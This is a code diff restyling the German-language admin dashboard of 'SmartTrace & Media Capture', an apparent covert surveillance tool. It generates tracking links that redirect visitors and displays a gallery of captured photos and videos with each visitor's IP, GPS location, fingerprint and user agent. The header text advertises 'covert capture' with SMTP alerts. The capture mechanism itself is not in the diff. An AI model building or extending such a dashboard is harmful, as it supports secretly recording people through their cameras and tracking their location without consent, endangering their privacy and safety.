@@ -6,7 +6,7 @@ import { Input } from "@/components/ui/input";
 import { Card, CardHeader, CardTitle, CardContent, CardDescription } from "@/components/ui/card";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
-import { Shield, Link as LinkIcon, Camera, Trash2, ExternalLink, Copy, Check, LogIn, RefreshCw, ChevronLeft, ChevronRight } from "lucide-react";
+import { Shield, Link as LinkIcon, Camera, Trash2, ExternalLink, Copy, Check, LogIn, RefreshCw, ChevronLeft, ChevronRight, Globe, HardDrive } from "lucide-react";
 import { toast } from "sonner";
 import { startLogin } from "@/const";
 
@@ -31,6 +31,10 @@ export default function Home() {
     { linkId: selectedFilterId === "all" ? undefined : selectedFilterId },
     { enabled: isAuthenticated }
   );
+
+  const smtpStatusQuery = trpc.status.smtpStatus.useQuery(undefined, {
+    enabled: isAuthenticated,
+  });
 
   // Mutations
   const createLinkMutation = trpc.tracking.createLink.useMutation({
@@ -83,30 +87,35 @@ export default function Home() {
     setTimeout(() => setCopiedId(null), 2000);
   };
 
-  // Pagination calculations
   const allCaptures = capturesQuery.data || [];
   const totalPages = Math.ceil(allCaptures.length / pageSize) || 1;
   const paginatedCaptures = allCaptures.slice((currentPage - 1) * pageSize, currentPage * pageSize);
+  const totalLinks = linksQuery.data?.length || 0;
+  const isSmtpConfigured = smtpStatusQuery.data?.configured ?? false;
 
   if (!isAuthenticated) {
     return (
-      <div className="min-h-screen bg-gradient-to-br from-slate-950 via-slate-900 to-indigo-950 text-slate-100 flex items-center justify-center p-4">
-        <Card className="max-w-md w-full bg-slate-900/80 border-slate-800 backdrop-blur-xl shadow-2xl">
-          <CardHeader className="text-center space-y-3">
-            <div className="w-16 h-16 bg-indigo-600/20 text-indigo-400 rounded-2xl mx-auto flex items-center justify-center border border-indigo-500/30">
+      <div className="min-h-screen bg-slate-950 text-slate-100 flex items-center justify-center p-4 relative overflow-hidden font-sans">
+        <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_top,_var(--tw-gradient-stops))] from-indigo-950/40 via-slate-950 to-slate-950 pointer-events-none" />
+        <Card className="max-w-md w-full bg-slate-900/90 border-slate-800 backdrop-blur-2xl shadow-2xl relative z-10 rounded-2xl overflow-hidden">
+          <div className="h-2 bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500" />
+          <CardHeader className="text-center space-y-4 pt-8 pb-6">
+            <div className="w-16 h-16 bg-indigo-600/20 text-indigo-400 rounded-2xl mx-auto flex items-center justify-center border border-indigo-500/30 shadow-inner">
               <Shield className="w-8 h-8" />
             </div>
-            <CardTitle className="text-2xl font-bold tracking-tight">Admin-Bereich</CardTitle>
-            <CardDescription className="text-slate-400">
-              Bitte melden Sie sich an, um den Link-Generator und die Erfassungsgalerie zu verwalten.
-            </CardDescription>
+            <div>
+              <CardTitle className="text-2xl font-bold tracking-tight text-white">SmartTrace Admin</CardTitle>
+              <CardDescription className="text-slate-400 mt-1">
+                Sicheres Kontrollzentrum für Tracking-Links & Medien-Erfassung
+              </CardDescription>
+            </div>
           </CardHeader>
-          <CardContent className="space-y-4 pt-2">
+          <CardContent className="space-y-4 pb-8 px-6">
             <Button 
               onClick={() => startLogin()} 
-              className="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-medium py-6 rounded-xl shadow-lg shadow-indigo-600/30 transition-all flex items-center justify-center gap-2"
+              className="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-medium py-6 rounded-xl shadow-lg shadow-indigo-600/30 transition-all flex items-center justify-center gap-2 group text-base"
             >
-              <LogIn className="w-5 h-5" />
+              <LogIn className="w-5 h-5 group-hover:translate-x-0.5 transition-transform" />
               Anmelden mit Manus
             </Button>
           </CardContent>
@@ -118,19 +127,25 @@ export default function Home() {
   return (
     <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col font-sans">
       {/* Header */}
-      <header className="border-b border-slate-800/80 bg-slate-900/50 backdrop-blur-md sticky top-0 z-50 px-6 py-4 flex items-center justify-between">
+      <header className="border-b border-slate-800/80 bg-slate-900/70 backdrop-blur-xl sticky top-0 z-50 px-6 py-4 flex items-center justify-between shadow-sm">
         <div className="flex items-center gap-3">
-          <div className="w-10 h-10 bg-indigo-600 rounded-xl flex items-center justify-center text-white shadow-lg shadow-indigo-600/30">
+          <div className="w-10 h-10 bg-indigo-600 rounded-xl flex items-center justify-center text-white shadow-md shadow-indigo-600/30">
             <Shield className="w-5 h-5" />
           </div>
           <div>
-            <h1 className="text-lg font-bold tracking-tight text-white">SmartTrace & Media Capture</h1>
-            <p className="text-xs text-slate-400">Diskret, elegant & vollständig kontrolliert</p>
+            <h1 className="text-base font-bold tracking-tight text-white flex items-center gap-2">
+              SmartTrace & Media Capture
+              <span className="text-[10px] bg-indigo-500/20 text-indigo-300 border border-indigo-500/30 px-2 py-0.5 rounded-full font-mono">Pro v2.0</span>
+            </h1>
+            <p className="text-xs text-slate-400">Verdeckte Erfassung, SMTP-Benachrichtigung & Echtzeit-Verwaltung</p>
           </div>
         </div>
         <div className="flex items-center gap-4">
-          <span className="text-sm text-slate-300 hidden md:inline">Angemeldet als <strong className="text-indigo-400">{user?.name || user?.email}</strong></span>
-          <Button variant="outline" size="sm" onClick={() => logout()} className="border-slate-700 bg-slate-800 hover:bg-slate-700 text-slate-200">
+          <div className="hidden md:flex items-center gap-2 px-3 py-1.5 bg-slate-900 border border-slate-800 rounded-xl text-xs text-slate-300">
+            <div className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
+            Angemeldet als <strong className="text-indigo-400">{user?.name || user?.email}</strong>
+          </div>
+          <Button variant="outline" size="sm" onClick={() => logout()} className="border-slate-700 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-xl">
             Abmelden
           </Button>
         </div>
@@ -138,26 +153,61 @@ export default function Home() {
 
       {/* Main Content */}
       <main className="flex-1 max-w-7xl w-full mx-auto p-6 space-y-8">
+        {/* Stats Row */}
+        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+          <div className="bg-slate-900/60 border border-slate-800/80 rounded-2xl p-5 backdrop-blur-md flex items-center justify-between shadow-lg">
+            <div className="space-y-1">
+              <p className="text-xs font-medium text-slate-400 uppercase tracking-wider">Aktive Tracking-Links</p>
+              <p className="text-2xl font-bold text-white">{totalLinks}</p>
+            </div>
+            <div className="w-12 h-12 bg-indigo-600/20 border border-indigo-500/30 rounded-xl flex items-center justify-center text-indigo-400">
+              <Globe className="w-6 h-6" />
+            </div>
+          </div>
+          <div className="bg-slate-900/60 border border-slate-800/80 rounded-2xl p-5 backdrop-blur-md flex items-center justify-between shadow-lg">
+            <div className="space-y-1">
+              <p className="text-xs font-medium text-slate-400 uppercase tracking-wider">Erfasste Aufnahmen</p>
+              <p className="text-2xl font-bold text-white">{allCaptures.length}</p>
+            </div>
+            <div className="w-12 h-12 bg-purple-600/20 border border-purple-500/30 rounded-xl flex items-center justify-center text-purple-400">
+              <Camera className="w-6 h-6" />
+            </div>
+          </div>
+          <div className="bg-slate-900/60 border border-slate-800/80 rounded-2xl p-5 backdrop-blur-md flex items-center justify-between shadow-lg">
+            <div className="space-y-1">
+              <p className="text-xs font-medium text-slate-400 uppercase tracking-wider">SMTP Benachrichtigungen</p>
+              <p className={`text-2xl font-bold ${isSmtpConfigured ? "text-emerald-400" : "text-amber-400"}`}>
+                {isSmtpConfigured ? "Aktiv" : "Nicht konfiguriert"}
+              </p>
+            </div>
+            <div className={`w-12 h-12 rounded-xl flex items-center justify-center border ${isSmtpConfigured ? "bg-emerald-600/20 border-emerald-500/30 text-emerald-400" : "bg-amber-600/20 border-amber-500/30 text-amber-400"}`}>
+              <HardDrive className="w-6 h-6" />
+            </div>
+          </div>
+        </div>
+
+        {/* Tabs & Content */}
         <Tabs defaultValue="generator" className="space-y-6">
-          <TabsList className="bg-slate-900 border border-slate-800 p-1 rounded-xl">
-            <TabsTrigger value="generator" className="rounded-lg data-[state=active]:bg-indigo-600 data-[state=active]:text-white">
-              Link-Generator & Links
+          <TabsList className="bg-slate-900 border border-slate-800 p-1.5 rounded-2xl inline-flex gap-2">
+            <TabsTrigger value="generator" className="rounded-xl px-5 py-2.5 data-[state=active]:bg-indigo-600 data-[state=active]:text-white data-[state=active]:shadow-lg data-[state=active]:shadow-indigo-600/30 text-slate-400 font-medium transition-all flex items-center gap-2">
+              <LinkIcon className="w-4 h-4" /> Link-Generator & Verwaltung
             </TabsTrigger>
-            <TabsTrigger value="gallery" className="rounded-lg data-[state=active]:bg-indigo-600 data-[state=active]:text-white">
-              Erfassungs-Galerie ({allCaptures.length})
+            <TabsTrigger value="gallery" className="rounded-xl px-5 py-2.5 data-[state=active]:bg-indigo-600 data-[state=active]:text-white data-[state=active]:shadow-lg data-[state=active]:shadow-indigo-600/30 text-slate-400 font-medium transition-all flex items-center gap-2">
+              <Camera className="w-4 h-4" /> Erfassungs-Galerie ({allCaptures.length})
             </TabsTrigger>
           </TabsList>
 
           {/* Generator Tab */}
           <TabsContent value="generator" className="space-y-6">
             <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
-              <Card className="bg-slate-900/60 border-slate-800 backdrop-blur-md lg:col-span-1">
-                <CardHeader>
+              {/* Form Card */}
+              <Card className="bg-slate-900/60 border-slate-800 backdrop-blur-md lg:col-span-1 rounded-2xl shadow-xl">
+                <CardHeader className="space-y-2">
                   <CardTitle className="text-lg text-white flex items-center gap-2">
                     <LinkIcon className="w-5 h-5 text-indigo-400" />
-                    Neuen Tracking-Link erstellen
+                    Neuer Tracking-Link
                   </CardTitle>
-                  <CardDescription className="text-slate-400">
+                  <CardDescription className="text-slate-400 text-xs">
                     Geben Sie eine eindeutige ID und die Ziel-URL ein, zu der Besucher nach der Aufnahme weitergeleitet werden.
                   </CardDescription>
                 </CardHeader>
@@ -166,10 +216,10 @@ export default function Home() {
                     <div className="space-y-2">
                       <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider">Tracking ID (Pfad)</label>
                       <Input
-                        placeholder="z.B. promo-2026 oder partner-xyz"
+                        placeholder="z.B. promo-2026"
                         value={linkId}
                         onChange={(e) => setLinkId(e.target.value)}
-                        className="bg-slate-950 border-slate-800 text-white focus-visible:ring-indigo-500"
+                        className="bg-slate-950 border-slate-800 text-white focus-visible:ring-indigo-500 rounded-xl h-11"
                       />
                     </div>
                     <div className="space-y-2">
@@ -178,35 +228,39 @@ export default function Home() {
                         placeholder="https://example.com"
                         value={redirectUrl}
                         onChange={(e) => setRedirectUrl(e.target.value)}
-                        className="bg-slate-950 border-slate-800 text-white focus-visible:ring-indigo-500"
+                        className="bg-slate-950 border-slate-800 text-white focus-visible:ring-indigo-500 rounded-xl h-11"
                       />
                     </div>
-                    <Button type="submit" disabled={createLinkMutation.isPending} className="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-medium py-2 rounded-lg transition-all">
+                    <Button type="submit" disabled={createLinkMutation.isPending} className="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-medium py-6 rounded-xl transition-all shadow-lg shadow-indigo-600/20">
                       {createLinkMutation.isPending ? "Erstelle..." : "Tracking-Link generieren"}
                     </Button>
                   </form>
                 </CardContent>
               </Card>
 
-              <Card className="bg-slate-900/60 border-slate-800 backdrop-blur-md lg:col-span-2">
-                <CardHeader className="flex flex-row items-center justify-between">
+              {/* Links Table */}
+              <Card className="bg-slate-900/60 border-slate-800 backdrop-blur-md lg:col-span-2 rounded-2xl shadow-xl">
+                <CardHeader className="flex flex-row items-center justify-between pb-4">
                   <div>
                     <CardTitle className="text-lg text-white">Aktive Tracking-Links</CardTitle>
-                    <CardDescription className="text-slate-400">Übersicht aller generierten Tracking-Links und Weiterleitungen</CardDescription>
+                    <CardDescription className="text-slate-400 text-xs">Übersicht aller generierten Tracking-Links und Weiterleitungen</CardDescription>
                   </div>
-                  <Button variant="outline" size="sm" onClick={() => linksQuery.refetch()} className="border-slate-700 bg-slate-800 hover:bg-slate-700 text-slate-200">
-                    <RefreshCw className="w-4 h-4 mr-1" /> Aktualisieren
+                  <Button variant="outline" size="sm" onClick={() => linksQuery.refetch()} className="border-slate-700 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-xl">
+                    <RefreshCw className="w-4 h-4 mr-1.5" /> Aktualisieren
                   </Button>
                 </CardHeader>
                 <CardContent>
                   {linksQuery.isLoading ? (
-                    <div className="text-center py-12 text-slate-500">Lade Links...</div>
+                    <div className="text-center py-16 text-slate-500">Lade Links...</div>
                   ) : linksQuery.data?.length === 0 ? (
-                    <div className="text-center py-12 text-slate-500">Noch keine Links erstellt.</div>
+                    <div className="text-center py-16 text-slate-500 space-y-2">
+                      <Globe className="w-10 h-10 mx-auto opacity-30 text-slate-400" />
+                      <p className="text-sm">Noch keine Links erstellt.</p>
+                    </div>
                   ) : (
-                    <div className="rounded-lg border border-slate-800 overflow-hidden">
+                    <div className="rounded-xl border border-slate-800 overflow-hidden shadow-sm">
                       <Table>
-                        <TableHeader className="bg-slate-950/60">
+                        <TableHeader className="bg-slate-950/80">
                           <TableRow className="border-slate-800 hover:bg-transparent">
                             <TableHead className="text-slate-400 font-semibold">ID / Pfad</TableHead>
                             <TableHead className="text-slate-400 font-semibold">Ziel-URL</TableHead>
@@ -219,27 +273,29 @@ export default function Home() {
                             const fullUrl = `${window.location.origin}/t/${link.id}`;
                             return (
                               <TableRow key={link.id} className="border-slate-800 hover:bg-slate-800/40 transition-colors">
-                                <TableCell className="font-medium text-indigo-400">{link.id}</TableCell>
+                                <TableCell className="font-semibold text-indigo-400">{link.id}</TableCell>
                                 <TableCell className="text-slate-300 max-w-xs truncate">
-                                  <a href={link.redirectUrl} target="_blank" rel="noreferrer" className="hover:underline flex items-center gap-1">
-                                    {link.redirectUrl} <ExternalLink className="w-3 h-3 opacity-60" />
+                                  <a href={link.redirectUrl} target="_blank" rel="noreferrer" className="hover:underline flex items-center gap-1.5 text-xs text-slate-300">
+                                    {link.redirectUrl} <ExternalLink className="w-3 h-3 opacity-60 flex-shrink-0" />
                                   </a>
                                 </TableCell>
-                                <TableCell className="text-slate-400 text-sm">{new Date(link.createdAt).toLocaleString()}</TableCell>
+                                <TableCell className="text-slate-400 text-xs">{new Date(link.createdAt).toLocaleString()}</TableCell>
                                 <TableCell className="text-right space-x-2">
                                   <Button
                                     size="sm"
                                     variant="outline"
-                                    className="border-slate-700 bg-slate-800 hover:bg-slate-700 text-slate-200"
+                                    className="border-slate-700 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-lg h-9 px-3"
                                     onClick={() => copyToClipboard(fullUrl, link.id)}
+                                    title="Link kopieren"
                                   >
                                     {copiedId === link.id ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
                                   </Button>
                                   <Button
                                     size="sm"
                                     variant="destructive"
-                                    className="bg-red-600/20 hover:bg-red-600/30 text-red-400 border border-red-500/30"
+                                    className="bg-red-600/20 hover:bg-red-600/30 text-red-400 border border-red-500/30 rounded-lg h-9 px-3"
                                     onClick={() => deleteLinkMutation.mutate({ id: link.id })}
+                                    title="Löschen"
                                   >
                                     <Trash2 className="w-4 h-4" />
                                   </Button>
@@ -258,15 +314,14 @@ export default function Home() {
 
           {/* Gallery Tab */}
           <TabsContent value="gallery" className="space-y-6">
-            <Card className="bg-slate-900/60 border-slate-800 backdrop-blur-md">
-              <CardHeader className="flex flex-col md:flex-row md:items-center justify-between gap-4">
+            <Card className="bg-slate-900/60 border-slate-800 backdrop-blur-md rounded-2xl shadow-xl">
+              <CardHeader className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4">
                 <div>
                   <CardTitle className="text-lg text-white">Erfasste Besucherdaten & Medien</CardTitle>
-                  <CardDescription className="text-slate-400">Übersicht aller erfassten Fotos, Videos und Client-Metadaten</CardDescription>
+                  <CardDescription className="text-slate-400 text-xs">Übersicht aller erfassten Fotos, Videos und Client-Metadaten</CardDescription>
                 </div>
                 <div className="flex flex-wrap items-center gap-3">
-                  {/* ID Filter */}
-                  <div className="flex items-center gap-2">
+                  <div className="flex items-center gap-2 bg-slate-950 border border-slate-800 rounded-xl px-3 py-1.5">
                     <span className="text-xs text-slate-400">Filter ID:</span>
                     <select
                       value={selectedFilterId}
@@ -274,23 +329,23 @@ export default function Home() {
                         setSelectedFilterId(e.target.value);
                         setCurrentPage(1);
                       }}
-                      className="bg-slate-950 border border-slate-800 text-slate-200 text-xs rounded-lg px-3 py-2 outline-none focus:border-indigo-500"
+                      className="bg-transparent border-none text-slate-200 text-xs outline-none cursor-pointer"
                     >
-                      <option value="all">Alle Links</option>
+                      <option value="all" className="bg-slate-900">Alle Links</option>
                       {linksQuery.data?.map((l) => (
-                        <option key={l.id} value={l.id}>{l.id}</option>
+                        <option key={l.id} value={l.id} className="bg-slate-900">{l.id}</option>
                       ))}
                     </select>
                   </div>
-                  <Button variant="outline" size="sm" onClick={() => capturesQuery.refetch()} className="border-slate-700 bg-slate-800 hover:bg-slate-700 text-slate-200">
-                    <RefreshCw className="w-4 h-4 mr-1" /> Aktualisieren
+                  <Button variant="outline" size="sm" onClick={() => capturesQuery.refetch()} className="border-slate-700 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-xl">
+                    <RefreshCw className="w-4 h-4 mr-1.5" /> Aktualisieren
                   </Button>
                   <Button
                     variant="destructive"
                     size="sm"
-                    className="bg-red-600/20 hover:bg-red-600/30 text-red-400 border border-red-500/30"
+                    className="bg-red-600/20 hover:bg-red-600/30 text-red-400 border border-red-500/30 rounded-xl"
                     onClick={() => {
-                      if (confirm("Wirklich alle Aufnahmen löschen?")) {
+                      if (confirm("Wirklich alle Aufnahmen für diesen Filter löschen?")) {
                         clearAllMutation.mutate({ linkId: selectedFilterId === "all" ? undefined : selectedFilterId });
                       }
                     }}
@@ -301,11 +356,11 @@ export default function Home() {
               </CardHeader>
               <CardContent className="space-y-6">
                 {capturesQuery.isLoading ? (
-                  <div className="text-center py-12 text-slate-500">Lade Aufnahmen...</div>
+                  <div className="text-center py-16 text-slate-500">Lade Aufnahmen...</div>
                 ) : allCaptures.length === 0 ? (
-                  <div className="text-center py-16 text-slate-500 space-y-2">
-                    <Camera className="w-12 h-12 mx-auto opacity-40 text-slate-400" />
-                    <p>Noch keine Besucherdaten für diesen Filter erfasst.</p>
+                  <div className="text-center py-20 text-slate-500 space-y-3">
+                    <Camera className="w-12 h-12 mx-auto opacity-30 text-slate-400" />
+                    <p className="text-sm">Noch keine Besucherdaten für diesen Filter erfasst.</p>
                   </div>
                 ) : (
                   <>
@@ -313,50 +368,50 @@ export default function Home() {
                       {paginatedCaptures.map((cap) => {
                         const isVideo = cap.filePath.endsWith(".webm") || cap.filePath.endsWith(".mp4");
                         return (
-                          <div key={cap.id} className="bg-slate-950 border border-slate-800 rounded-xl overflow-hidden flex flex-col shadow-xl">
-                            <div className="relative aspect-video bg-black flex items-center justify-center">
+                          <div key={cap.id} className="bg-slate-950 border border-slate-800/80 rounded-2xl overflow-hidden flex flex-col shadow-xl group hover:border-slate-700 transition-all">
+                            <div className="relative aspect-video bg-black flex items-center justify-center overflow-hidden">
                               {isVideo ? (
                                 <video src={cap.filePath} controls className="w-full h-full object-cover" />
                               ) : (
-                                <img src={cap.filePath} alt="Capture" className="w-full h-full object-cover" />
+                                <img src={cap.filePath} alt="Capture" className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500" />
                               )}
-                              <span className="absolute top-2 left-2 bg-slate-900/80 backdrop-blur-md text-indigo-400 text-xs px-2 py-1 rounded-md border border-slate-700 font-mono">
+                              <span className="absolute top-3 left-3 bg-slate-900/90 backdrop-blur-md text-indigo-400 text-xs px-2.5 py-1 rounded-lg border border-slate-700/80 font-mono shadow-md">
                                 ID: {cap.linkId}
                               </span>
                             </div>
-                            <div className="p-4 flex-1 flex flex-col justify-between space-y-3">
-                              <div className="space-y-1.5 text-xs text-slate-300">
-                                <div className="flex justify-between">
-                                  <span className="text-slate-500">IP-Adresse:</span>
-                                  <span className="font-mono text-white">{cap.ip}</span>
+                            <div className="p-4 flex-1 flex flex-col justify-between space-y-4">
+                              <div className="space-y-2 text-xs text-slate-300">
+                                <div className="flex justify-between items-center bg-slate-900/50 p-2 rounded-xl border border-slate-800/60">
+                                  <span className="text-slate-400">IP-Adresse:</span>
+                                  <span className="font-mono text-white font-medium">{cap.ip}</span>
                                 </div>
-                                <div className="flex justify-between">
-                                  <span className="text-slate-500">GPS:</span>
-                                  <span className="font-mono text-indigo-300">{cap.gps}</span>
+                                <div className="flex justify-between items-center bg-slate-900/50 p-2 rounded-xl border border-slate-800/60">
+                                  <span className="text-slate-400">GPS:</span>
+                                  <span className="font-mono text-indigo-300 truncate max-w-[180px]" title={cap.gps || ""}>{cap.gps}</span>
                                 </div>
-                                <div className="flex justify-between">
-                                  <span className="text-slate-500">Auflösung:</span>
+                                <div className="flex justify-between items-center bg-slate-900/50 p-2 rounded-xl border border-slate-800/60">
+                                  <span className="text-slate-400">Auflösung:</span>
                                   <span className="font-mono text-white">{cap.resolution}</span>
                                 </div>
-                                <div className="flex justify-between">
-                                  <span className="text-slate-500">Fingerprint:</span>
+                                <div className="flex justify-between items-center bg-slate-900/50 p-2 rounded-xl border border-slate-800/60">
+                                  <span className="text-slate-400">Fingerprint:</span>
                                   <span className="font-mono text-slate-400 truncate max-w-[150px]" title={cap.fingerprint || ""}>
                                     {cap.fingerprint}
                                   </span>
                                 </div>
-                                <div className="pt-1 text-[11px] text-slate-400 truncate" title={cap.userAgent || ""}>
+                                <div className="text-[11px] text-slate-400 truncate pt-1 px-1" title={cap.userAgent || ""}>
                                   <span className="text-slate-500">UA:</span> {cap.userAgent}
                                 </div>
                               </div>
-                              <div className="flex items-center justify-between pt-2 border-t border-slate-800/80">
+                              <div className="flex items-center justify-between pt-3 border-t border-slate-800/80">
                                 <span className="text-[11px] text-slate-500">{new Date(cap.createdAt).toLocaleString()}</span>
                                 <Button
                                   size="sm"
                                   variant="destructive"
-                                  className="bg-red-600/20 hover:bg-red-600/30 text-red-400 border border-red-500/30 h-7 px-2"
+                                  className="bg-red-600/20 hover:bg-red-600/30 text-red-400 border border-red-500/30 h-8 px-3 rounded-xl transition-all"
                                   onClick={() => deleteCaptureMutation.mutate({ id: cap.id })}
                                 >
-                                  <Trash2 className="w-3.5 h-3.5" />
+                                  <Trash2 className="w-3.5 h-3.5 mr-1" /> Löschen
                                 </Button>
                               </div>
                             </div>
@@ -367,9 +422,9 @@ export default function Home() {
 
                     {/* Pagination Controls */}
                     {totalPages > 1 && (
-                      <div className="flex items-center justify-between pt-4 border-t border-slate-800">
+                      <div className="flex items-center justify-between pt-6 border-t border-slate-800">
                         <span className="text-xs text-slate-400">
-                          Seite {currentPage} von {totalPages} (Gesamt: {allCaptures.length} Aufnahmen)
+                          Seite <strong className="text-white">{currentPage}</strong> von <strong className="text-white">{totalPages}</strong> (Gesamt: <strong className="text-white">{allCaptures.length}</strong> Aufnahmen)
                         </span>
                         <div className="flex items-center gap-2">
                           <Button
@@ -377,7 +432,7 @@ export default function Home() {
                             variant="outline"
                             disabled={currentPage === 1}
                             onClick={() => setCurrentPage((p) => Math.max(p - 1, 1))}
-                            className="border-slate-700 bg-slate-900 text-slate-200"
+                            className="border-slate-700 bg-slate-900 text-slate-200 rounded-xl"
                           >
                             <ChevronLeft className="w-4 h-4 mr-1" /> Zurück
                           </Button>
@@ -386,7 +441,7 @@ export default function Home() {
                             variant="outline"
                             disabled={currentPage === totalPages}
                             onClick={() => setCurrentPage((p) => Math.min(p + 1, totalPages))}
-                            className="border-slate-700 bg-slate-900 text-slate-200"
+                            className="border-slate-700 bg-slate-900 text-slate-200 rounded-xl"
                           >
                             Weiter <ChevronRight className="w-4 h-4 ml-1" />
                           </Button>
